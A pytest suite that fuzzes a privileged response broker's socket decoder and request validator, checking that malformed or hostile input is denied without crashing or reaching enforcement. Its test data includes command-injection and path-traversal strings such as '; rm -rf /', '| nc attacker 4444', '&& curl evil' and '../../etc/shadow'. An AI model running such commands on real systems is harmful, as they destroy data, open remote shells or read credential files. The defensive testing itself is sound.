"""Hostile input against the privileged boundary.

The broker is the component that parses data produced by the process most
likely to be compromised. Its required behaviour under garbage is narrow:
**controlled rejection.** Never a crash, never a hang, never execution, and
never an ALLOW.

A crash matters as much as a wrong allow. A broker that dies on malformed
input is a denial of service on containment itself, reachable by anything
that can open the socket -- and an attacker who can crash the broker has
disabled the response path without ever needing to defeat policy.
"""

from __future__ import annotations

import json
import os
import random
import socket
import struct
import threading
from datetime import datetime, timedelta, timezone
from pathlib import Path

import pytest

from annulon.response import ipc
from annulon.response.broker import Broker, BrokerConfig
from annulon.response.contract import ActionType, SCHEMA_VERSION, Target, TargetKind
from annulon.response.enforcement import RecordingEnforcer
from annulon.response.policy import BrokerPolicy

HOST, BOOT, UID = "host-alpha", "boot-7", 1500
SEED = 20260921        # fixed, so a failure is reproducible


@pytest.fixture
def broker(tmp_path):
    config = BrokerConfig(
        host_id=HOST, boot_id=BOOT,
        socket_path=str(tmp_path / "broker.sock"),
        journal_path=tmp_path / "actions.jsonl",
        caller_uids={os.getuid(): "annulon-core"})
    # Generous ceilings on purpose. The active-action and rate limits are
    # real and are tested in test_broker_ipc.py; leaving them low here made
    # every case after the fourth deny for an unrelated reason, which hid
    # what this suite is actually asking about.
    policy = BrokerPolicy(permitted_uids=frozenset({UID}),
                          authorized_callers=frozenset({"annulon-core"}),
                          max_active_actions=100_000,
                          max_requests_per_minute=1_000_000)
    return Broker(config, policy, enforcer=RecordingEnforcer(),
                  clock=lambda: datetime(2026, 9, 21, 12, tzinfo=timezone.utc))


def _valid_request() -> dict:
    return {
        "schema_version": SCHEMA_VERSION, "request_id": "req-abcdef012345",
        "action_type": ActionType.TEMPORARY_EGRESS_RESTRICTION.value,
        "target": {"kind": TargetKind.SERVICE_UID.value, "host_id": HOST,
                   "boot_id": BOOT, "identifier": str(UID),
                   "service_name": "batch-worker"},
        "duration_seconds": 300, "reason": "exfiltration",
        "finding_id": "finding-00001234",
        "requested_at": datetime(2026, 9, 21, 12, tzinfo=timezone.utc).isoformat(),
        "requesting_component": "annulon-core", "policy_version": "",
        "destination_cidr": None,
    }


# --------------------------------------------------------------------------
# The decoder, below the broker
# --------------------------------------------------------------------------

def _round_trip(raw: bytes, *, declared: int | None = None):
    """Push raw bytes through a real socket pair into the decoder.

    The send runs on its own thread. A socketpair buffer is far smaller than
    the message cap, so sending a cap-sized body inline deadlocks: nothing
    drains the socket until the send returns, and the send cannot return
    until something drains it. Found by a hung test, not by reasoning.
    """
    left, right = socket.socketpair(socket.AF_UNIX)
    length = declared if declared is not None else len(raw)
    payload = struct.pack("!I", length) + raw

    def _send():
        try:
            left.sendall(payload)
        except OSError:
            pass
        finally:
            left.close()

    sender = threading.Thread(target=_send, daemon=True)
    sender.start()
    try:
        right.settimeout(5.0)
        return ipc.read_message(right)
    finally:
        right.close()
        sender.join(timeout=5)


MALFORMED_BODIES = [
    b"",                                    # empty
    b"{",                                   # truncated object
    b"[]",                                  # a list, not an object
    b'"a string"',
    b"42",
    b"null",
    b"\xff\xfe\x00\x01",                    # not UTF-8
    b'{"a": }',                             # invalid JSON
    b'{"a": 1,}',                           # trailing comma
    b'{"a": NaN}',                          # not valid JSON
    b'{"a": Infinity}',
    b"\x00" * 64,                           # NUL sled
    b'{"type": "action_request"' + b" " * 100,
]


@pytest.mark.parametrize("body", MALFORMED_BODIES, ids=range(len(MALFORMED_BODIES)))
def test_a_malformed_body_is_rejected_not_executed(body):
    with pytest.raises(ipc.IpcError):
        _round_trip(body)


def test_a_declared_length_beyond_the_cap_is_refused_before_the_body():
    """The broker must not allocate for, or wait on, a message it will reject."""
    with pytest.raises(ipc.MessageTooLarge):
        _round_trip(b"{}", declared=ipc.MAX_MESSAGE_BYTES + 1)
    with pytest.raises(ipc.MessageTooLarge):
        _round_trip(b"{}", declared=0xFFFFFFFF)


def test_a_declared_length_longer_than_the_body_does_not_hang():
    """A truncated send is closed, not waited on forever."""
    with pytest.raises(ipc.IpcError):
        _round_trip(b"{}", declared=4096)


def test_deep_nesting_is_refused():
    """``json`` recurses while parsing, so nesting is a stack primitive."""
    payload = b'{"a":' * 200 + b"1" + b"}" * 200
    with pytest.raises(ipc.IpcError):
        _round_trip(payload)


def test_a_body_at_the_cap_is_accepted_and_one_byte_over_is_not():
    """The boundary is measured, not asserted from arithmetic (KF-05)."""
    filler = "x" * (ipc.MAX_MESSAGE_BYTES - len(b'{"a":""}'))
    body = json.dumps({"a": filler}, separators=(",", ":")).encode()
    assert len(body) == ipc.MAX_MESSAGE_BYTES
    assert _round_trip(body)["a"] == filler
    with pytest.raises(ipc.MessageTooLarge):
        _round_trip(body + b" ")


def test_the_writer_refuses_to_send_an_oversized_message():
    left, right = socket.socketpair(socket.AF_UNIX)
    try:
        with pytest.raises(ipc.MessageTooLarge):
            ipc.write_message(left, {"a": "x" * (ipc.MAX_MESSAGE_BYTES + 10)})
    finally:
        left.close()
        right.close()


# --------------------------------------------------------------------------
# The broker, above the decoder
# --------------------------------------------------------------------------

_counter = iter(range(1, 10 ** 7))


def _mutate(base: dict, field: str, value) -> dict:
    """Mutate one field, with a fresh request id.

    Every case needs its own id. Reusing one made the broker deny the second
    acceptable value as a replay -- correct behaviour, but it read as a
    contract failure until the ids were separated.
    """
    payload = dict(base)
    payload["request_id"] = f"req-{next(_counter):012d}"
    payload[field] = value
    return {"schema_version": SCHEMA_VERSION, "type": "action_request",
            "request": payload}


HOSTILE_VALUES = [
    None, True, False, -1, 0, 2 ** 63, -(2 ** 63), 1.5, float("inf"),
    "", " ", "\x00", "\n", "../../etc/shadow", "/etc/passwd",
    "; rm -rf /", "$(id)", "`id`", "| nc attacker 4444", "&& curl evil",
    "‮", "﻿", "\U0001f4a5", "א" * 10, "A" * 10_000,
    [], {}, [1, 2, 3], {"nested": {"deeper": {}}},
]

FIELDS = ["request_id", "action_type", "target", "duration_seconds", "reason",
          "finding_id", "requested_at", "requesting_component",
          "policy_version", "destination_cidr", "schema_version"]


#: Not every field is an identifier. ``reason`` is free text written for a
#: human reading an audit record; it is never parsed, never used as a path
#: and never reaches a command, so rejecting ``"../../etc/shadow"`` there
#: would be theatre. ``policy_version`` and ``destination_cidr`` are
#: optional, and empty means unset.
#:
#: So the property is per-field, not blanket: a value is acceptable exactly
#: when the contract says it is, and everything else must be denied. Writing
#: it this way forced each field's actual rule to be stated.
def _acceptable(field: str, value) -> bool:
    if field == "reason":
        return (isinstance(value, str) and bool(value.strip())
                and len(value) <= 256
                and all(0x20 <= ord(c) != 0x7F for c in value))
    if field == "policy_version":
        return value is None or (
            isinstance(value, str) and len(value) <= 64
            and all(0x20 <= ord(c) != 0x7F for c in value))
    if field == "destination_cidr":
        return value is None or value == ""
    return False


@pytest.mark.parametrize("field", FIELDS)
def test_every_field_is_accepted_exactly_when_the_contract_says_so(broker, field):
    """No value may produce an allow unless the contract permits it, and none
    may produce an exception or reach the backend."""
    base = _valid_request()
    for value in HOSTILE_VALUES:
        response = broker.handle(_mutate(base, field, value),
                                 caller="annulon-core")
        assert isinstance(response, dict)
        expected = "allow" if _acceptable(field, value) else "deny"
        assert response.get("decision") == expected, (
            f"{field}={value!r} expected {expected}, got {response.get('decision')}")


def test_free_text_is_stored_as_data_and_never_interpreted(broker):
    """A path- or command-shaped reason is recorded verbatim and inertly.

    The safety claim is not that the string is refused; it is that nothing
    ever treats it as anything but text.
    """
    hostile = "; nft flush ruleset && curl evil.example/../../etc/shadow"
    base = _valid_request()
    base["request_id"] = f"req-{next(_counter):012d}"
    base["reason"] = hostile
    response = broker.handle(
        {"schema_version": SCHEMA_VERSION, "type": "action_request",
         "request": base}, caller="annulon-core")
    assert response["decision"] == "allow"
    entry = broker.journal.get(base["request_id"])
    assert entry is not None
    raw = broker.journal.path.read_text()
    assert "\n" not in json.loads(raw.splitlines()[0])["detail"]
    assert broker._enforcer.applied == [base["request_id"]]


@pytest.mark.parametrize("value", ["\n", "\r\n", "\x00", "a\nb", "\x1b[31m"])
def test_a_control_character_in_the_reason_is_refused(broker, value):
    """A newline in a field that lands in an audit record lets a caller write
    what looks like a second entry."""
    base = _valid_request()
    base["request_id"] = f"req-{next(_counter):012d}"
    base["reason"] = f"exfiltration{value}forged"
    response = broker.handle(
        {"schema_version": SCHEMA_VERSION, "type": "action_request",
         "request": base}, caller="annulon-core")
    assert response["decision"] == "deny"


@pytest.mark.parametrize("value", ["../../../etc/shadow", "/etc/passwd",
                                   "1500; nft flush ruleset", "1500 && id",
                                   "1500\n1501", "1500\x00", "$(id)", "1500/../0"])
def test_a_path_or_command_shaped_target_is_refused(broker, value):
    """The target identifier is compared against OS state, so metacharacters
    in it have no legitimate meaning."""
    base = _valid_request()
    base["target"] = dict(base["target"], identifier=value)
    response = broker.handle(
        {"schema_version": SCHEMA_VERSION, "type": "action_request",
         "request": base}, caller="annulon-core")
    assert response["decision"] == "deny"


@pytest.mark.parametrize("seconds", [-1, 0, -86_400, 2 ** 31, 2 ** 63,
                                     86_401, 10 ** 18])
def test_an_out_of_range_duration_is_refused(broker, seconds):
    response = broker.handle(_mutate(_valid_request(), "duration_seconds", seconds),
                             caller="annulon-core")
    assert response["decision"] == "deny"


@pytest.mark.parametrize("message", [
    {}, {"type": "action_request"}, {"schema_version": SCHEMA_VERSION},
    {"schema_version": 0, "type": "action_request", "request": {}},
    {"schema_version": 99, "type": "action_request", "request": {}},
    {"schema_version": SCHEMA_VERSION, "type": "run_shell"},
    {"schema_version": SCHEMA_VERSION, "type": "action_request"},
    {"schema_version": SCHEMA_VERSION, "type": "action_request", "request": None},
    {"schema_version": SCHEMA_VERSION, "type": "action_request", "request": []},
    {"schema_version": SCHEMA_VERSION, "type": "action_request", "request": "x"},
])
def test_a_structurally_wrong_envelope_is_denied(broker, message):
    response = broker.handle(message, caller="annulon-core")
    assert response["decision"] == "deny"


def test_no_hostile_input_ever_reaches_the_backend(broker, tmp_path):
    """The strongest form of the property: garbage cannot cause an action."""
    enforcer = broker._enforcer
    base = _valid_request()
    for field in FIELDS:
        for value in HOSTILE_VALUES:
            if _acceptable(field, value):
                continue        # the contract permits it; not a fuzz case
            broker.handle(_mutate(base, field, value), caller="annulon-core")
    assert enforcer.applied == [], "malformed input reached the enforcement backend"


def test_randomised_fuzzing_never_allows_and_never_raises(broker):
    """Structure-aware fuzzing over the request shape.

    Seeded, so any failure is reproducible rather than a story about a
    flaky test.
    """
    rng = random.Random(SEED)
    base = _valid_request()
    allowed = 0
    for _ in range(3000):
        payload = dict(base)
        payload["request_id"] = f"req-{next(_counter):012d}"
        for _ in range(rng.randint(1, 4)):
            field = rng.choice(FIELDS + ["unexpected_field", "authorized"])
            value = rng.choice(HOSTILE_VALUES)
            if _acceptable(field, value):
                # The contract permits it, so an allow here would be correct
                # behaviour rather than a finding.
                value = "\x00"
            payload[field] = value
        message = {"schema_version": rng.choice([SCHEMA_VERSION, SCHEMA_VERSION, 0, 7]),
                   "type": rng.choice(["action_request", "action_request",
                                       "status_request", "run_shell", ""]),
                   "request": payload}
        response = broker.handle(message, caller="annulon-core")
        assert isinstance(response, dict)
        if response.get("decision") == "allow":
            allowed += 1
    assert allowed == 0, f"{allowed} fuzzed request(s) were allowed"
    assert broker._enforcer.applied == []


def test_fuzzing_an_unauthorized_caller_never_allows(broker):
    """The same fuzz, from a caller the kernel does not vouch for."""
    rng = random.Random(SEED + 1)
    base = _valid_request()
    for _ in range(1000):
        payload = dict(base)
        payload["request_id"] = f"req-{next(_counter):012d}"
        payload[rng.choice(FIELDS)] = rng.choice(HOSTILE_VALUES)
        response = broker.handle(
            {"schema_version": SCHEMA_VERSION, "type": "action_request",
             "request": payload}, caller="unknown")
        assert response.get("decision") == "deny"


def test_a_valid_request_still_works_after_the_fuzzing(broker):
    """A guard that rejects everything proves nothing.

    The positive control: after all of the above, a well-formed request from
    an authorized caller is still allowed.
    """
    fresh = _valid_request()
    fresh["request_id"] = f"req-{next(_counter):012d}"
    response = broker.handle(
        {"schema_version": SCHEMA_VERSION, "type": "action_request",
         "request": fresh}, caller="annulon-core")
    assert response["decision"] == "allow", response
